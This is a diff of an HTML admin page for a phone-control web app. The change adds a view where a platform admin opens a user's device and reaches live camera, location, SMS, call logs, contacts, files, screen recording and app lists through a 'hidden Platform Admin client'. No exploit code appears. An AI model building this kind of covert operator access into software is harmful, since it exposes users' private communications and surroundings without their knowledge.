@@ -10,7 +10,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="/device/styles.css" />
-  <link rel="stylesheet" href="/device/admin/admin.css?v=1" />
+  <link rel="stylesheet" href="/device/admin/admin.css?v=3" />
 </head>
 <body class="device-app admin-app">
   <div id="view-login" class="login-shell">
@@ -70,7 +70,7 @@
       </div>
     </header>
 
-    <nav class="admin-tabs" role="tablist">
+    <nav class="admin-tabs" role="tablist" id="admin-main-tabs">
       <button type="button" class="admin-tab active" data-tab="dashboard">Dashboard</button>
       <button type="button" class="admin-tab" data-tab="users">Users</button>
       <button type="button" class="admin-tab" data-tab="admins">Admins</button>
@@ -88,34 +88,190 @@
       </section>
 
       <section id="tab-users" class="admin-panel" hidden>
-        <div class="surface">
-          <div class="admin-toolbar">
-            <input id="users-search" class="input" type="search" placeholder="Search email, uid, device…" />
-            <select id="users-status" class="input">
-              <option value="all">All</option>
-              <option value="active">Active</option>
-              <option value="blocked">Blocked</option>
-            </select>
-            <button id="btn-users-refresh" class="btn-secondary" type="button">Refresh</button>
+        <!-- Users table -->
+        <div id="users-list-view">
+          <div class="surface">
+            <div class="admin-toolbar">
+              <input id="users-search" class="input" type="search" placeholder="Search email, uid, device…" />
+              <select id="users-status" class="input">
+                <option value="all">All</option>
+                <option value="active">Active</option>
+                <option value="blocked">Blocked</option>
+              </select>
+              <button id="btn-users-refresh" class="btn-secondary" type="button">Refresh</button>
+            </div>
+            <div class="table-wrap">
+              <table class="admin-table">
+                <thead>
+                  <tr>
+                    <th>Email</th>
+                    <th>Devices</th>
+                    <th>Online</th>
+                    <th>Last seen</th>
+                    <th>Status</th>
+                    <th></th>
+                  </tr>
+                </thead>
+                <tbody id="users-tbody">
+                  <tr><td colspan="6" class="muted">Loading…</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p id="users-status-text" class="muted" style="margin-top:10px;" aria-live="polite"></p>
           </div>
-          <div class="table-wrap">
-            <table class="admin-table">
-              <thead>
-                <tr>
-                  <th>Email</th>
-                  <th>Devices</th>
-                  <th>Online</th>
-                  <th>Last seen</th>
-                  <th>Status</th>
-                  <th></th>
-                </tr>
-              </thead>
-              <tbody id="users-tbody">
-                <tr><td colspan="6" class="muted">Loading…</td></tr>
-              </tbody>
-            </table>
+        </div>
+
+        <!-- User detail: all devices expanded (no side drawer) -->
+        <div id="user-detail-view" hidden>
+          <header class="page-head">
+            <div>
+              <button type="button" class="btn-secondary" id="btn-back-users">← Back to users</button>
+              <h1 id="user-detail-title" style="margin-top:12px;">User</h1>
+              <p id="user-detail-sub" class="page-sub"></p>
+            </div>
+            <div id="user-detail-actions" class="page-actions"></div>
+          </header>
+          <div id="user-detail-body" class="admin-user-detail-body">Loading…</div>
+        </div>
+
+        <!-- Device control: same layout as normal user My Phone -->
+        <div id="device-control-view" hidden>
+          <header class="page-head">
+            <div>
+              <button type="button" class="btn-secondary" id="btn-back-user-devices">← Back to devices</button>
+              <h1 style="margin-top:12px;">My Phone <span class="admin-badge ok" style="vertical-align:middle;">Admin</span></h1>
+              <p id="device-control-owner" class="page-sub">Controlling a user’s device. Their paired browsers stay intact.</p>
+            </div>
+            <button id="btn-device-refresh" class="btn-secondary" type="button">Refresh</button>
+          </header>
+
+          <div class="device-picker-bar surface">
+            <label class="device-picker-label" for="admin-device-select">Connected device</label>
+            <div class="device-picker-row">
+              <select id="admin-device-select" class="input device-picker-select" aria-label="Select device"></select>
+            </div>
+            <p id="admin-device-hint" class="muted device-picker-hint"></p>
           </div>
-          <p id="users-status-text" class="muted" style="margin-top:10px;" aria-live="polite"></p>
+
+          <div class="phone-tabs" role="tablist" aria-label="Phone features" id="admin-phone-tabs">
+            <button type="button" class="phone-tab active" role="tab" aria-selected="true" data-phone-tab="camera"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Camera &amp; Voice</span><span class="tab-label-short">Camera</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="location"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Location</span><span class="tab-label-short">Location</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="info"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Device Information</span><span class="tab-label-short">Info</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="gallery"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Gallery</span><span class="tab-label-short">Gallery</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="notifications"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Notifications</span><span class="tab-label-short">Alerts</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="messages"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Messages</span><span class="tab-label-short">SMS</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="call-logs"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Call Logs</span><span class="tab-label-short">Calls</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="contacts"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Contacts</span><span class="tab-label-short">Contacts</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="files"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">File Manager</span><span class="tab-label-short">Files</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="screen"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Screen Mirror</span><span class="tab-label-short">Mirror</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="recording"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Screen Recording</span><span class="tab-label-short">Record</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="apps"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Installed Apps</span><span class="tab-label-short">Apps</span></button>
+          </div>
+
+          <div id="admin-panel-camera" class="phone-tab-panel" data-phone-panel="camera">
+            <p class="page-sub tab-intro">Connect starts live view via Platform Admin (user browsers stay paired). Phone may need a notification tap.</p>
+            <div id="admin-camera-body" class="device-list"></div>
+          </div>
+          <div id="admin-panel-location" class="phone-tab-panel" data-phone-panel="location" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Cached GPS from the phone. Sync to refresh.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-secondary" data-admin-cmd="LOCATION_GET_CURRENT">Update location</button>
+              </div>
+            </div>
+            <div id="admin-location-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-info" class="phone-tab-panel" data-phone-panel="info" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Readable device details (not JSON).</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="DEVICE_INFO_REFRESH">Refresh Information</button>
+                <button type="button" class="btn-secondary" data-admin-cmd="SCREEN_LOCK">Lock screen</button>
+                <button type="button" class="btn-secondary" data-admin-cmd="SCREEN_UNLOCK">Unlock / wake</button>
+              </div>
+            </div>
+            <div id="admin-info-body" class="surface device-info-view">Loading…</div>
+          </div>
+          <div id="admin-panel-gallery" class="phone-tab-panel" data-phone-panel="gallery" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Cached MediaStore index from the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-secondary" data-admin-cmd="GALLERY_INDEX">Request index</button>
+              </div>
+            </div>
+            <div id="admin-gallery-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-notifications" class="phone-tab-panel" data-phone-panel="notifications" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Mirrored notifications cached on this device.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="NOTIFICATIONS_SYNC">Sync from phone</button>
+              </div>
+            </div>
+            <div id="admin-notifications-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-messages" class="phone-tab-panel" data-phone-panel="messages" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">SMS / messages mirrored from the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="MESSAGES_SYNC">Sync from phone</button>
+              </div>
+            </div>
+            <div id="admin-messages-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-call-logs" class="phone-tab-panel" data-phone-panel="call-logs" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Call history cached from the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="CALL_LOGS_SYNC">Sync from phone</button>
+              </div>
+            </div>
+            <div id="admin-call-logs-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-contacts" class="phone-tab-panel" data-phone-panel="contacts" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Contacts cached from the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="CONTACTS_SYNC">Sync from phone</button>
+              </div>
+            </div>
+            <div id="admin-contacts-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-files" class="phone-tab-panel" data-phone-panel="files" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Shared folders granted on the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-secondary" data-admin-cmd="FILE_LIST">Refresh folders</button>
+              </div>
+            </div>
+            <div id="admin-files-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-screen" class="phone-tab-panel" data-phone-panel="screen" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Screen mirror needs Android system cast consent on the phone.</p>
+            </div>
+            <div id="admin-screen-body" class="surface"></div>
+          </div>
+          <div id="admin-panel-recording" class="phone-tab-panel" data-phone-panel="recording" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Screen recordings cached from the phone (system cast consent required to start).</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" id="btn-admin-rec-start">Start recording</button>
+                <button type="button" class="btn-danger-soft" id="btn-admin-rec-stop">Stop</button>
+              </div>
+            </div>
+            <div id="admin-recording-body" class="surface muted">Loading…</div>
+          </div>
+          <div id="admin-panel-apps" class="phone-tab-panel" data-phone-panel="apps" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Installed apps list. Lock needs Accessibility on the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" data-admin-cmd="APPS_INDEX">Sync apps</button>
+              </div>
+            </div>
+            <div id="admin-apps-body" class="surface muted">Loading…</div>
+          </div>
+          <p id="admin-action-status" class="muted" style="margin-top:12px;" aria-live="polite"></p>
         </div>
       </section>
 
@@ -134,36 +290,6 @@
     </main>
   </div>
 
-  <aside id="user-drawer" class="admin-drawer" hidden>
-    <div class="admin-drawer-inner surface">
-      <header class="admin-drawer-head">
-        <div>
-          <h2 id="drawer-title">User</h2>
-          <p id="drawer-sub" class="muted"></p>
-        </div>
-        <button id="btn-drawer-close" class="btn-secondary" type="button">Close</button>
-      </header>
-      <div id="drawer-actions" class="row-gap" style="margin:12px 0;"></div>
-      <div id="drawer-body" class="admin-drawer-body muted">Select a user.</div>
-    </div>
-  </aside>
-
-  <aside id="device-drawer" class="admin-drawer" hidden>
-    <div class="admin-drawer-inner surface admin-device-drawer">
-      <header class="admin-drawer-head">
-        <div>
-          <h2 id="device-drawer-title">Device</h2>
-          <p id="device-drawer-sub" class="muted"></p>
-        </div>
-        <button id="btn-device-drawer-close" class="btn-secondary" type="button">Close</button>
-      </header>
-      <p class="muted" style="margin:8px 0 0;">
-        Control uses a hidden <strong>Platform Admin</strong> client. User browsers stay paired. Live camera/screen may ask to take over if they are already live.
-      </p>
-      <div id="device-drawer-body" class="admin-drawer-body">Loading…</div>
-    </div>
-  </aside>
-
-  <script type="module" src="/device/admin/app.js?v=2"></script>
+  <script type="module" src="/device/admin/app.js?v=3"></script>
 </body>
 </html>
